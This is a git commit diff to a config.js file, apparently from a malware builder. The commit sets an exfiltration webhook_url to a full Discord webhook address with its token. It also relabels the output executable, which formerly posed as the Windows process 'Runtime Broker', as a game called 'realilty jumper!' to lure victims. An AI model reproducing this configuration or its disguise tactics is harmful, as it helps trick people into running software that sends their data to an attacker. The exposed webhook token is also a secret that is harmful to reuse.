4959abc888052431a67ba08836cd1d3c6d93e59f
ctfvygbhjnkmkfghj <tiasmith1115@gmail.com>
2024-07-15 09:16:45 -0400

    Updbvate config.js

--- config.js
+++ config.js
@@ -1,12 +1,12 @@
 module.exports = () => {
     return {
-        webhook_url: "REPLACE_ME",
+        webhook_url: "https://discordapp.com/api/webhooks/1260101262117044245/2LmF16unK9GiazCvxeuA3-8CQyWw_boG2byLrJiuyi-gIRkHZZO7S5C2iANgqQx3s_KP",
         icon: './default.ico',
         properties: {
-            FileDescription: 'Runtime Broker',
-            ProductName: 'Runtime Broker',
-            LegalCopyright: 'Runtime Broker ©️ 2023',
-            OriginalFilename: 'RuntimeBroker.exe'
+            FileDescription: 'has to be one of the best games on earth',
+            ProductName: 'realilty jumper!r',
+            LegalCopyright: 'realilty jumper! ©️ 2023',
+            OriginalFilename: 'realilty jumper!.exe'
         }
     }
 }
